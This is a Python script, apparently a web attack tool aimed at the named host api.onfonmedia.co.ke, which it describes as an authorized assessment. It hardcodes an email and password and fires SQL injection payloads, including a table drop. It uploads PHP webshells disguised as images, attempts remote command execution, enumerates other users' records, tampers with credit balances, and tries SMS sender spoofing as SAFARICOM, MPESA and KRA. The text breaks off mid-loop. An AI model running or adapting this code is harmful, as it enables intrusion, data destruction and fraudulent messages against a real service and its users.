#!/usr/bin/env python3
"""
OneFone / api.onfonmedia.co.ke — Authorized Security Assessment
Engagement: Cyberdeck Consultants | LOA Ref: api.onfonmedia.co.ke/CTO/LOA/2026/012
Run: pip install requests && python3 sweep.py
"""

import requests
import json
import time
import re
import sys
import os
import socket
import base64
import warnings
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore")  # suppress SSL warnings for self-signed certs

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET      = "https://api.onfonmedia.co.ke"
BASE_DOMAIN = "onfonmedia.co.ke"
EMAIL       = "cm4anonymous@gmail.com"
PASSWORD    = "Mwasin254.$"
TIMEOUT     = 15
REPORT_OUT  = "onefone_report.html"

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    "Accept": "application/json, text/html, */*",
    "Accept-Language": "en-US,en;q=0.9",
})
SESSION.verify = False

FINDINGS = []
RECON    = {}

# ─── HELPERS ──────────────────────────────────────────────────────────────────
def url(path):
    return urljoin(TARGET, path)

def log(tag, msg, color="\033[0m"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{ts}] [{tag}]\033[0m {msg}")

def ok(msg):   log("OK",   msg, "\033[92m")
def warn(msg): log("WARN", msg, "\033[93m")
def crit(msg): log("CRIT", msg, "\033[91m")
def info(msg): log("INFO", msg, "\033[94m")

def finding(severity, title, detail, evidence=""):
    FINDINGS.append({
        "severity": severity, "title": title,
        "detail": detail, "evidence": str(evidence),
        "time": datetime.now().isoformat()
    })
    color = {"CRITICAL": "\033[91m", "HIGH": "\033[91m",
             "MEDIUM": "\033[93m", "LOW": "\033[94m", "INFO": "\033[96m"}.get(severity, "")
    if severity in ("CRITICAL", "HIGH"):
        crit(f"[{severity}] {title}")
    else:
        warn(f"[{severity}] {title}")

def safe_get(path_or_url, **kw):
    try:
        target = path_or_url if path_or_url.startswith("http") else url(path_or_url)
        r = SESSION.get(target, timeout=TIMEOUT, allow_redirects=True, verify=False, **kw)
        return r
    except Exception:
        return None

def safe_post(path_or_url, **kw):
    try:
        target = path_or_url if path_or_url.startswith("http") else url(path_or_url)
        r = SESSION.post(target, timeout=TIMEOUT, allow_redirects=True, verify=False, **kw)
        return r
    except Exception:
        return None

# ─── PHASE 1: RECON ───────────────────────────────────────────────────────────
def phase_recon():
    info("=" * 60)
    info("PHASE 1 — RECONNAISSANCE")
    info("=" * 60)

    r = safe_get("/")
    if r:
        RECON["status_root"] = r.status_code
        RECON["headers"] = dict(r.headers)
        info(f"Root → HTTP {r.status_code}")
        for h in ["Server", "X-Powered-By", "X-Frame-Options", "Content-Security-Policy",
                  "Strict-Transport-Security", "X-Content-Type-Options", "Access-Control-Allow-Origin"]:
            v = r.headers.get(h)
            if v:
                info(f"  {h}: {v}")
            else:
                warn(f"  {h}: MISSING")
                if h in ("X-Frame-Options", "X-Content-Type-Options", "Strict-Transport-Security"):
                    finding("MEDIUM", f"Missing security header: {h}",
                            f"The {h} header is absent, increasing exposure to common browser attacks.",
                            f"GET / → headers: {dict(r.headers)}")

        if r.cookies:
            for c in r.cookies:
                issues = []
                if not c.secure:
                    issues.append("Secure flag missing")
                if not c.has_nonstandard_attr("HttpOnly"):
                    issues.append("HttpOnly missing")
                if not c.has_nonstandard_attr("SameSite"):
                    issues.append("SameSite missing")
                if issues:
                    finding("MEDIUM", f"Cookie misconfiguration: {c.name}",
                            f"Cookie '{c.name}' is missing: {', '.join(issues)}", str(c))

        csp = r.headers.get("Content-Security-Policy", "")
        if not csp:
            finding("MEDIUM", "No Content-Security-Policy header",
                    "Absence of CSP increases XSS risk.")
        elif "unsafe-inline" in csp or "unsafe-eval" in csp:
            finding("MEDIUM", "Weak CSP — unsafe-inline or unsafe-eval present",
                    f"CSP value: {csp}")

        origin_test = SESSION.get(url("/"), headers={"Origin": "https://evil.com"},
                                  timeout=TIMEOUT, verify=False)
        acao = origin_test.headers.get("Access-Control-Allow-Origin", "")
        if acao == "*" or acao == "https://evil.com":
            finding("HIGH", "Wildcard or reflected CORS",
                    f"Server reflects arbitrary Origin. ACAO: {acao}",
                    f"Request Origin: evil.com → Response ACAO: {acao}")

    sensitive = [
        "/.env", "/.env.local", "/.env.backup", "/.env.production",
        "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/config.json", "/config.php", "/.DS_Store",
        "/package.json", "/package-lock.json", "/composer.json",
        "/wp-config.php", "/database.yml", "/secrets.yml",
        "/storage/logs/laravel.log", "/logs/error.log",
        "/.htaccess", "/web.config", "/server.xml",
        "/api/swagger.json", "/api/openapi.json", "/swagger.json",
        "/swagger-ui.html", "/api-docs", "/openapi.yaml",
    ]
    info(f"Probing {len(sensitive)} sensitive paths...")
    for path in sensitive:
        r = safe_get(path)
        if r is None:
            continue
        if r.status_code == 200:
            body = r.text[:500]
            if any(kw in body.lower() for kw in ["db_", "database", "password", "secret",
                                                   "key", "api_key", "token", "mysql", "redis"]):
                finding("CRITICAL", f"Sensitive file exposed: {path}",
                        "HTTP 200 with credential-like content.", body)
            else:
                finding("HIGH", f"File accessible: {path}",
                        "HTTP 200 returned for sensitive path.", body[:200])
            crit(f"  {path} → 200 EXPOSED")
        elif r.status_code == 403:
            warn(f"  {path} → 403 (may exist, blocked by server)")
            RECON.setdefault("403_paths", []).append(path)

    dirs = [
        "/admin", "/administrator", "/phpmyadmin", "/pma",
        "/horizon", "/telescope", "/nova", "/pulse",
        "/backup", "/backups", "/dumps", "/exports",
        "/uploads", "/upload", "/files", "/storage/app/public",
        "/public/uploads", "/assets", "/static",
        "/api/v1", "/api/v2", "/api/v3",
        "/dashboard", "/dashboard/settings",
        "/user", "/users", "/account", "/accounts",
        "/sms", "/messages", "/contacts", "/campaigns",
        "/reports", "/analytics", "/billing", "/payments",
    ]
    info(f"Mapping {len(dirs)} common paths...")
    RECON["accessible"] = []
    for path in dirs:
        r = safe_get(path)
        if r and r.status_code not in (404,):
            RECON["accessible"].append({"path": path, "status": r.status_code, "len": len(r.text)})
            info(f"  {path} → {r.status_code} ({len(r.text)} bytes)")

    ok("Phase 1 complete.")

# ─── PHASE 2: AUTHENTICATION ──────────────────────────────────────────────────
def phase_auth():
    info("=" * 60)
    info("PHASE 2 — AUTHENTICATION & SESSION ANALYSIS")
    info("=" * 60)

    login_paths = [
        ("/api/auth/login",    {"email": EMAIL, "password": PASSWORD}),
        ("/api/login",         {"email": EMAIL, "password": PASSWORD}),
        ("/api/v1/auth/login", {"email": EMAIL, "password": PASSWORD}),
        ("/api/v1/login",      {"email": EMAIL, "password": PASSWORD}),
        ("/login",             {"email": EMAIL, "password": PASSWORD}),
        ("/auth/login",        {"email": EMAIL, "password": PASSWORD}),
        ("/api/user/login",    {"email": EMAIL, "password": PASSWORD}),
        ("/api/signin",        {"email": EMAIL, "password": PASSWORD}),
    ]

    authenticated = False
    for path, payload in login_paths:
        r = safe_post(path, json=payload, headers={"Content-Type": "application/json"})
        if r and r.status_code in (200, 201):
            try:
                data = r.json()
                token = (data.get("token") or data.get("access_token") or
                         data.get("data", {}).get("token") or
                         data.get("data", {}).get("access_token"))
                if token:
                    SESSION.headers["Authorization"] = f"Bearer {token}"
                    RECON["auth_token"] = token
                    RECON["auth_path"] = path
                    ok(f"Authenticated via {path} — token: {token[:40]}...")
                    authenticated = True
                    if "expires_in" in data:
                        info(f"  Token expires in: {data['expires_in']}s")
                    break
            except Exception:
                authenticated = True
                break
        elif r and r.status_code not in (404, 405, 422):
            info(f"  {path} → {r.status_code}: {r.text[:150]}")

        r2 = safe_post(path, data=payload)
        if r2 and r2.status_code in (200, 201, 302):
            if r2.status_code == 302:
                loc = r2.headers.get("Location", "")
                if "login" not in loc and "error" not in loc:
                    ok(f"  Form login at {path} → redirect to {loc}")
                    authenticated = True
                    break

    info("Testing unauthenticated access to protected endpoints...")
    protected = ["/api/user", "/api/users", "/api/contacts", "/api/sms",
                 "/api/messages", "/api/campaigns", "/api/balance", "/api/wallet",
                 "/api/reports", "/dashboard/settings", "/api/settings"]
    tmp_auth = SESSION.headers.pop("Authorization", None)
    for path in protected:
        r = safe_get(path)
        if r and r.status_code == 200 and len(r.text) > 100 and "login" not in r.text.lower():
            finding("CRITICAL", "Unauthenticated access to protected endpoint",
                    f"{path} returns data without authentication.", r.text[:500])
            crit(f"  AUTH BYPASS: {path} → 200 unauthenticated!")
    if tmp_auth:
        SESSION.headers["Authorization"] = tmp_auth

    info("Testing login rate-limiting...")
    for i in range(6):
        r = safe_post("/api/auth/login", json={"email": EMAIL, "password": "wrongpassword123"})
        if r is None:
            break
        if r.status_code == 429:
            ok(f"  Rate limiting active after {i+1} attempts.")
            break
        if i == 5:
            finding("MEDIUM", "No login rate limiting detected",
                    "6 consecutive failed login attempts returned no 429/lockout.",
                    f"Last status: {r.status_code}")

    if not authenticated:
        warn("Could not authenticate — proceeding with unauthenticated tests.")
    else:
        ok("Authentication phase complete.")
    return authenticated

# ─── PHASE 3: AUTHENTICATED SURFACE MAP ───────────────────────────────────────
def phase_surface_map():
    info("=" * 60)
    info("PHASE 3 — AUTHENTICATED SURFACE MAPPING")
    info("=" * 60)

    api_endpoints = [
        "/api/user", "/api/users", "/api/profile",
        "/api/contacts", "/api/contact",
        "/api/sms", "/api/sms/send", "/api/sms/history",
        "/api/messages", "/api/message",
        "/api/campaigns", "/api/campaign",
        "/api/balance", "/api/wallet", "/api/credits",
        "/api/reports", "/api/analytics",
        "/api/settings", "/api/config",
        "/api/billing", "/api/invoices", "/api/payments",
        "/api/api-keys", "/api/tokens",
        "/api/webhooks", "/api/integrations",
        "/api/admin", "/api/admin/users",
        "/api/export", "/api/import",
        "/api/upload", "/api/files",
        "/api/v1/user", "/api/v1/sms", "/api/v1/contacts",
        "/api/v2/user", "/api/v2/sms",
    ]

    found = []
    info(f"Probing {len(api_endpoints)} API endpoints...")
    for path in api_endpoints:
        r = safe_get(path)
        if r and r.status_code not in (404, 405):
            found.append({"path": path, "status": r.status_code,
                          "content_type": r.headers.get("Content-Type", ""),
                          "length": len(r.text), "body": r.text[:300]})
            info(f"  {path} → {r.status_code} [{r.headers.get('Content-Type', '')}] {len(r.text)}b")
    RECON["api_endpoints"] = found
    ok(f"Found {len(found)} responsive endpoints.")

# ─── PHASE 4: SQL INJECTION ───────────────────────────────────────────────────
def phase_sqli():
    info("=" * 60)
    info("PHASE 4 — SQL INJECTION")
    info("=" * 60)

    payloads = [
        "'", '"', "' OR '1'='1", "' OR '1'='1'--",
        "' OR 1=1--", "' OR 1=1#", "'; DROP TABLE users--",
        "1' AND SLEEP(3)--", "1' AND (SELECT 3000 FROM(SELECT(SLEEP(3)))a)--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'--", "' OR 'x'='x", "') OR ('x'='x",
        "1 OR 1=1", "1; SELECT * FROM users",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
    ]

    error_signatures = [
        "sql syntax", "mysql_fetch", "ora-", "odbc driver",
        "microsoft ole db", "sqlite3", "postgresql", "pg_query",
        "syntax error", "unclosed quotation", "sqlstate",
        "you have an error in your sql", "warning: mysql",
        "invalid query", "division by zero",
    ]

    test_params = ["id", "user_id", "contact_id", "campaign_id",
                   "message_id", "phone", "email", "q", "search",
                   "filter", "sort", "order", "page", "limit",
                   "sender_id", "group_id", "report_id"]

    endpoints = ["/api/contacts", "/api/messages", "/api/sms",
                 "/api/users", "/api/campaigns", "/api/reports",
                 "/api/v1/contacts", "/api/v1/messages"]

    info(f"Testing {len(endpoints)} endpoints × {len(test_params)} params × {len(payloads)} payloads...")

    for endpoint in endpoints:
        baseline = safe_get(endpoint)
        if baseline is None:
            continue
        baseline_len = len(baseline.text)

        for param in test_params[:5]:
            for payload in payloads:
                r = safe_get(f"{endpoint}?{param}={quote(payload)}")
                if r is None:
                    continue
                body_low = r.text.lower()

                if any(sig in body_low for sig in error_signatures):
                    finding("CRITICAL", "SQL Injection — Error-based",
                            f"SQL error returned at {endpoint}?{param}={payload}",
                            r.text[:800])
                    crit(f"  SQLi ERROR: {endpoint}?{param}={payload}")

                if "SLEEP" in payload or "sleep" in payload:
                    t0 = time.time()
                    r2 = safe_get(f"{endpoint}?{param}={quote(payload)}")
                    elapsed = time.time() - t0
                    if elapsed > 2.5:
                        finding("CRITICAL", "SQL Injection — Time-based blind",
                                f"Response delayed {elapsed:.1f}s at {endpoint}?{param}={payload}",
                                f"Elapsed: {elapsed:.2f}s")
                        crit(f"  SQLi TIME-BASED: {endpoint}?{param}={payload} ({elapsed:.1f}s)")

                if "UNION" in payload and abs(len(r.text) - baseline_len) > 200:
                    finding("HIGH", "Potential UNION-based SQL Injection",
                            f"Response length changed significantly at {endpoint}?{param}={payload}",
                            f"Baseline: {baseline_len}b | Injected: {len(r.text)}b\n{r.text[:400]}")

    post_targets = [
        ("/api/auth/login", "email"),
        ("/api/contacts",   "phone"),
        ("/api/sms/send",   "message"),
    ]
    for path, field in post_targets:
        for payload in payloads[:5]:
            r = safe_post(path, json={field: payload, "password": "test"})
            if r and any(sig in r.text.lower() for sig in error_signatures):
                finding("CRITICAL", "SQL Injection in POST body",
                        f"SQL error at POST {path} field '{field}'", r.text[:800])

    ok("SQL injection phase complete.")

# ─── PHASE 5: FILE UPLOAD ─────────────────────────────────────────────────────
def _try_exec(upload_path, fname, endpoint, body):
    """Attempt RCE on a successfully uploaded file via multiple params and commands."""
    rce_commands = ["id", "whoami", "hostname", "cat /etc/passwd", "uname -a"]
    rce_params   = ["cmd", "c", "exec", "command", "run", "shell", "execute", "x", "ping", "download", "q"]

    for cmd_path in [upload_path, "/" + upload_path.lstrip("/")]:
        for param in rce_params:
            for cmd in rce_commands[:3]:
                try:
                    shell_r = SESSION.get(
                        url(f"{cmd_path}?{param}={quote(cmd)}"),
                        timeout=TIMEOUT, verify=False)
                    if shell_r and any(x in shell_r.text for x in
                                       ["uid=", "root", "www-data", "nobody", "/bin/", "Linux"]):
                        finding("CRITICAL", "Remote Code Execution — Webshell Executed",
                                f"Shell at {TARGET}{cmd_path}?{param}={cmd}\n→ {shell_r.text[:200]}",
                                shell_r.text[:500])
                        crit(f"  RCE CONFIRMED: {TARGET}{cmd_path}?{param}={cmd}")
                        RECON.setdefault("rce_paths", []).append(f"{TARGET}{cmd_path}")
                        return True
                except Exception:
                    pass
    return False

def _record_upload(status, fname, endpoint, body, desc):
    paths = re.findall(
        r'["\']([^"\']*(?:upload|file|storage|public|media|avatar|img)[^"\']*\.[a-z0-9]{1,6})["\']',
        body, re.IGNORECASE)
    url_paths = re.findall(
        r'https?://[^\s\'"<>]+(?:upload|file|storage|public|media|avatar|img)[^\s\'"<>]+',
        body, re.IGNORECASE)
    found_path = (paths or url_paths or [None])[0]

    if found_path:
        finding("CRITICAL", f"File upload succeeded: {fname}",
                f"{desc}\nEndpoint: {endpoint}\nServer path: {found_path}", body[:600])
        crit(f"  UPLOAD SUCCESS: {fname} → {found_path}")
        return found_path
    else:
        finding("HIGH", f"File upload returned {status}: {fname}",
                f"{desc}\nEndpoint: {endpoint}\nResponse: {body[:300]}", body[:600])
        warn(f"  UPLOAD {status}: {fname} (no path in response)")
        return None

def phase_file_upload():
    info("=" * 60)
    info("PHASE 5 — FILE UPLOAD VULNERABILITIES + RCE")
    info("=" * 60)

    upload_endpoints = [
        "/dashboard/settings",
        "/api/upload", "/api/files", "/api/profile",
        "/api/profile/avatar", "/api/user/avatar", "/api/user/photo",
        "/api/settings", "/api/settings/logo",
        "/api/import", "/api/contacts/import", "/api/sms/import",
        "/upload", "/uploads",
    ]

    PHP_SHELL = b"<?php system($_GET['cmd']); ?>"
    PHP_INFO  = b"<?php phpinfo(); ?>"
    GIF_PHP   = b"GIF89a\n<?php system($_GET['cmd']); ?>"
    PNG_PHP   = b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>"
    JPG_PHP   = b"\xff\xd8\xff\xe0" + b"\x00" * 12 + b"<?php system($_GET['cmd']); ?>"
    SVG_XSS   = (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
                 b'<script>alert(document.cookie)</script></svg>')
    HTML_XSS  = b"<html><body><script>alert(document.domain)</script></body></html>"
    HTACCESS  = b"AddType application/x-httpd-php .jpg .png .gif\nOptions +ExecCGI"
    CSV_INJECT = b'id,name,phone\n1,=cmd|"/C calc"!A0,+254700000000'

    test_files = [
        ("shell.php",         PHP_SHELL,  "application/x-php",        "Direct PHP webshell"),
        ("shell.PHP",         PHP_SHELL,  "application/x-php",        "Uppercase .PHP bypass"),
        ("shell.phtml",       PHP_SHELL,  "application/x-php",        ".phtml bypass"),
        ("shell.php5",        PHP_SHELL,  "application/x-php",        ".php5 bypass"),
        ("shell.php7",        PHP_SHELL,  "application/x-php",        ".php7 bypass"),
        ("shell.phar",        PHP_SHELL,  "application/octet-stream", ".phar bypass"),
        ("shell.shtml",       PHP_SHELL,  "text/html",                ".shtml SSI bypass"),
        ("shell.php.jpg",     PHP_SHELL,  "image/jpeg",               "Double ext .php.jpg"),
        ("shell.jpg.php",     PHP_SHELL,  "image/jpeg",               "Double ext .jpg.php"),
        ("shell.php.png",     PHP_SHELL,  "image/png",                "Double ext .php.png"),
        ("shell.php.gif",     PHP_SHELL,  "image/gif",                "Double ext .php.gif"),
        ("shell.php.txt",     PHP_SHELL,  "text/plain",               "Double ext .php.txt"),
        ("shell.gif",         GIF_PHP,    "image/gif",                "GIF magic bytes + PHP polyglot"),
        ("shell.png",         PNG_PHP,    "image/png",                "PNG magic bytes + PHP polyglot"),
        ("shell.jpg",         JPG_PHP,    "image/jpeg",               "JPEG magic bytes + PHP polyglot"),
        ("shell.php\x00.jpg", PHP_SHELL,  "image/jpeg",               "Null byte truncation"),
        ("../shell.php",      PHP_SHELL,  "application/x-php",        "Path traversal ../"),
        ("../../shell.php",   PHP_SHELL,  "application/x-php",        "Path traversal ../../"),
        ("....//shell.php",   PHP_SHELL,  "application/x-php",        "Traversal ..// variant"),
        (".htaccess",         HTACCESS,   "application/octet-stream", ".htaccess → exec jpg as php"),
        ("xss.svg",           SVG_XSS,   "image/svg+xml",            "SVG XSS"),
        ("xss.html",          HTML_XSS,  "text/html",                "HTML upload XSS"),
        ("contacts.csv",      CSV_INJECT, "text/csv",                 "CSV formula injection"),
        ("big.txt",           b"A" * 50_000_000, "text/plain",       "50 MB size limit test"),
    ]

    field_names = ["file", "image", "avatar", "photo", "attachment",
                   "document", "upload", "logo", "picture", "profile_picture",
                   "profile_image", "import", "csv"]

    success_count = 0

    for endpoint in upload_endpoints:
        info(f"\n  Probing endpoint: {endpoint}")
        probe = safe_get(endpoint)
        if probe and probe.status_code == 404:
            info(f"    → 404, skipping")
            continue

        for fname, content, ctype, desc in test_files:
            if len(content) > 1_000_000 and endpoint != "/dashboard/settings":
                continue

            for field in field_names:
                try:
                    r = SESSION.post(url(endpoint),
                                     files={field: (fname, content, ctype)},
                                     timeout=TIMEOUT, verify=False)
                    if r is None:
                        continue
                    body = r.text
                    code = r.status_code

                    if code in (200, 201):
                        up_path = _record_upload(code, fname, endpoint, body, desc)
                        if up_path:
                            success_count += 1
                            if any(x in fname for x in (".php", ".phtml", ".phar",
                                                         ".php5", ".php7", ".shtml")):
                                _try_exec(up_path, fname, endpoint, body)
                            elif fname in ("shell.gif", "shell.png", "shell.jpg"):
                                _try_exec(up_path, fname, endpoint, body)
                        break

                    elif code == 413:
                        if len(content) > 1_000_000:
                            finding("INFO", f"Upload size limit enforced at {endpoint}",
                                    f"413 returned for {len(content)//1_000_000}MB file.")
                        break

                except Exception:
                    pass

    # Deep probe /dashboard/settings multipart form
    info("\n  Deep probe — /dashboard/settings multipart form fields...")
    form_data = {"_method": "PUT", "_token": ""}
    settings_fields = [
        ("profile_picture", "avatar.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("company_logo",    "logo.php",   b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("logo",            "logo.php",   b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("favicon",         "fav.php",    b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("banner",          "banner.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("cover",           "cover.php",  b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("photo",           "photo.php",  b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("file",            "file.php",   b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("profile_picture", "avatar.gif", b"GIF89a\n<?php system($_GET['cmd']); ?>", "image/gif"),
        ("logo",            "logo.gif",   b"GIF89a\n<?php system($_GET['cmd']); ?>", "image/gif"),
        ("photo",           "photo.jpg",  b"\xff\xd8\xff\xe0" + b"\x00" * 12 + b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ]
    for field, fname, content, ctype in settings_fields:
        try:
            r = SESSION.post(url("/dashboard/settings"), data=form_data,
                             files={field: (fname, content, ctype)},
                             timeout=TIMEOUT, verify=False)
            if r and r.status_code in (200, 201, 302):
                body = r.text
                if r.status_code == 302:
                    info(f"    {field}={fname} → 302 → {r.headers.get('Location','')}")
                elif "error" not in body.lower() and "invalid" not in body.lower():
                    up_path = _record_upload(r.status_code, fname, "/dashboard/settings", body,
                                             f"Settings form field '{field}'")
                    if up_path and ".php" in fname:
                        _try_exec(up_path, fname, "/dashboard/settings", body)
        except Exception:
            pass

    info("\n  Checking upload storage paths for directory listing / shell access...")
    storage_paths = [
        "/uploads/", "/upload/", "/files/", "/media/",
        "/storage/", "/storage/app/public/",
        "/public/uploads/", "/public/files/",
        "/assets/uploads/", "/user-uploads/",
    ]
    for spath in storage_paths:
        r = safe_get(spath)
        if r and r.status_code == 200:
            if any(kw in r.text.lower() for kw in ["index of", "parent directory", ".php", ".phtml"]):
                finding("HIGH", f"Directory listing at {spath}",
                        "Upload directory is browseable.", r.text[:600])

    info(f"\n  File upload phase complete. {success_count} successful upload(s).")
    ok("File upload phase complete.")

# ─── PHASE 6: IDOR & ACCESS CONTROL ──────────────────────────────────────────
def phase_idor():
    info("=" * 60)
    info("PHASE 6 — IDOR & BROKEN ACCESS CONTROL")
    info("=" * 60)

    own_id = None
    r = safe_get("/api/user")
    if r and r.status_code == 200:
        try:
            data = r.json()
            own_id = data.get("id") or data.get("user_id") or data.get("data", {}).get("id")
            info(f"Own user ID: {own_id}")
        except Exception:
            pass

    id_patterns = [
        "/api/users/{id}", "/api/contacts/{id}", "/api/messages/{id}",
        "/api/campaigns/{id}", "/api/invoices/{id}", "/api/reports/{id}",
        "/api/payments/{id}",
    ]

    info("Testing IDOR via sequential ID enumeration...")
    for pattern in id_patterns:
        hits = []
        for test_id in range(1, 20):
            if own_id and test_id == own_id:
                continue
            path = pattern.format(id=test_id)
            r = safe_get(path)
            if r and r.status_code == 200 and len(r.text) > 50:
                hits.append(test_id)
                if len(hits) == 1:
                    finding("HIGH", "IDOR — Access to other users' data",
                            f"Accessed {path} without ownership. Returned {len(r.text)} bytes.",
                            r.text[:500])
                    crit(f"  IDOR: {path} → 200")
        if hits:
            warn(f"  {pattern} — {len(hits)} IDs accessible: {hits[:10]}")

    info("Testing horizontal privilege escalation...")
    admin_paths = [
        "/api/admin", "/api/admin/users", "/api/admin/settings",
        "/api/admin/credits", "/api/admin/billing",
        "/admin", "/admin/users", "/admin/dashboard",
    ]
    for path in admin_paths:
        r = safe_get(path)
        if r and r.status_code == 200 and len(r.text) > 100:
            finding("HIGH", "Unauthorized admin endpoint access",
                    f"Non-admin account accessed {path}.", r.text[:500])
            crit(f"  PRIV ESC: {path} → 200")

    info("Testing parameter tampering...")
    tamper_tests = [
        ("/api/sms/send",     {"phone": "+1234567890", "message": "test", "credits": -1000}),
        ("/api/sms/send",     {"phone": "+1234567890", "message": "test", "sender_id": "ADMIN"}),
        ("/api/credits/add",  {"amount": 999999, "user_id": 1}),
    ]
    for path, payload in tamper_tests:
        r = safe_post(path, json=payload)
        if r and r.status_code in (200, 201):
            try:
                data = r.json()
                if "balance" in str(data) or "credits" in str(data):
                    finding("HIGH", "Parameter tampering — potential financial manipulation",
                            f"POST {path} with tampered payload accepted.\nPayload: {payload}",
                            r.text[:500])
            except Exception:
                pass

    ok("IDOR phase complete.")

# ─── PHASE 7: CREDENTIAL & SECRET SCAN ───────────────────────────────────────
def phase_credentials():
    info("=" * 60)
    info("PHASE 7 — CREDENTIAL & SECRET EXPOSURE")
    info("=" * 60)

    secret_patterns = [
        (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})", "API Key"),
        (r"(?i)(secret[_-]?key|secret)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})", "Secret Key"),
        (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"]{8,})", "Password"),
        (r"(?i)(db[_-]?password|database[_-]?password)\s*[:=]\s*['\"]?([^\s'\"]{4,})", "DB Password"),
        (r"(?i)(access[_-]?token|bearer)\s*[:=]\s*['\"]?([A-Za-z0-9_\-\.]{20,})", "Access Token"),
        (r"sk-[A-Za-z0-9]{40,}", "OpenAI/Stripe Secret Key"),
        (r"AIza[A-Za-z0-9_\-]{35}", "Google API Key"),
        (r"mysql://[^@]+:[^@]+@", "MySQL Connection String"),
        (r"postgres://[^@]+:[^@]+@", "Postgres Connection String"),
        (r"mongodb://[^@]+:[^@]+@", "MongoDB Connection String"),
    ]

    js_paths = [
        "/_next/static/chunks/main.js", "/_next/static/chunks/pages/index.js",
        "/_next/static/chunks/webpack.js", "/static/js/main.js",
        "/static/js/bundle.js", "/assets/js/app.js", "/js/app.js", "/app.js",
    ]

    info("Scanning JS bundles for hardcoded secrets...")
    for js_path in js_paths:
        r = safe_get(js_path)
        if r and r.status_code == 200 and len(r.text) > 100:
            info(f"  Found JS bundle: {js_path} ({len(r.text)} bytes)")
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, r.text)
                if matches:
                    finding("CRITICAL", f"Hardcoded {label} in JS bundle",
                            f"Pattern matched in {js_path}", str(matches[:3]))

    info("Checking API responses for secret leakage...")
    for path in ["/api/user", "/api/settings", "/api/config",
                 "/api/profile", "/api/integrations", "/api/webhooks"]:
        r = safe_get(path)
        if r and r.status_code == 200:
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, r.text)
                if matches:
                    finding("HIGH", f"{label} exposed in API response",
                            f"Pattern matched in response from {path}", str(matches[:3]))

    ok("Credential scan phase complete.")

# ─── PHASE 8: LOGIC FLAWS ─────────────────────────────────────────────────────
def phase_logic():
    info("=" * 60)
    info("PHASE 8 — BUSINESS LOGIC FLAWS")
    info("=" * 60)

    info("Testing negative amount manipulation...")
    r = safe_post("/api/credits/add", json={"amount": -99999})
    if r and r.status_code in (200, 201):
        finding("HIGH", "Negative credit amount accepted",
                "Server accepted a negative credit top-up amount.", r.text[:300])

    info("Testing race condition on credit deduction...")
    results = []

    def send_sms():
        r = safe_post("/api/sms/send", json={"phone": "+254700000000", "message": "race test"})
        if r:
            results.append(r.status_code)

    threads = [threading.Thread(target=send_sms) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    successes = results.count(200) + results.count(201)
    if successes > 1:
        finding("HIGH", f"Race condition — {successes} simultaneous SMS sends accepted",
                "Multiple concurrent requests may cause double credit deduction or free sends.",
                f"Results: {results}")

    info("Testing mass messaging without sufficient balance...")
    r = safe_post("/api/sms/bulk-send",
                  json={"contacts": ["+254700000001"] * 1000, "message": "test"})
    if r and r.status_code in (200, 201):
        finding("HIGH", "Mass SMS dispatch without balance validation",
                "Bulk send endpoint accepted 1000 recipients.", r.text[:300])

    info("Testing sender ID spoofing...")
    for spoof in ["SAFARICOM", "MPESA", "KRA", "BANK", "ADMIN", "GOD"]:
        r = safe_post("/api/sms/send",
                      json={"phone": "+254700000000", "message": "test", "sender_id": spoof})
        if r and r.status_code in (200, 201):
            finding("HIGH", f"Sender ID spoofing accepted: '{spoof}'",
                    f"Server allowed arbitrary sender ID '{spoof}'.", r.text[:200])

    ok("Logic flaw phase complete.")

# ─── PHASE 9: WEB VULNS (XSS/SSRF/CMDi/HEADERS) ─────────────────────────────
def phase_web():
    info("=" * 60)
    info("PHASE 9 — WEB VULNERABILITIES (XSS / SSRF / CMDi / SSTI)")
    info("=" * 60)

    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(document.domain)</script>",
        "<svg/onload=alert(1)>",
        "${7*7}", "{{7*7}}", "<%=7*7%>",
    ]

    ssrf_targets = [
        "http://localhost", "http://127.0.0.1",
        "http://169.254.169.254", "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal", "http://0.0.0.0",
        "file:///etc/passwd",
    ]

    info("Testing reflected XSS...")
    xss_params = ["q", "search", "name", "message", "phone", "filter", "callback"]
    for param in xss_params:
        for payload in xss_payloads[:3]:
            r = safe_get(f"/api/search?{param}={quote(payload)}")
            if r and payload in r.text:
                csp = r.headers.get("Content-Security-Policy", "")
                if not csp or "unsafe-inline" in csp:
                    finding("HIGH", "Reflected XSS",
                            f"Payload reflected at /api/search?{param}=...",
                            f"Payload: {payload}\nResponse: {r.text[:300]}")

    info("Testing SSRF...")
    ssrf_params = ["url", "webhook", "callback", "redirect", "return_url",
                   "image_url", "logo_url", "target", "host"]
    for param in ssrf_params:
        for target in ssrf_targets[:3]:
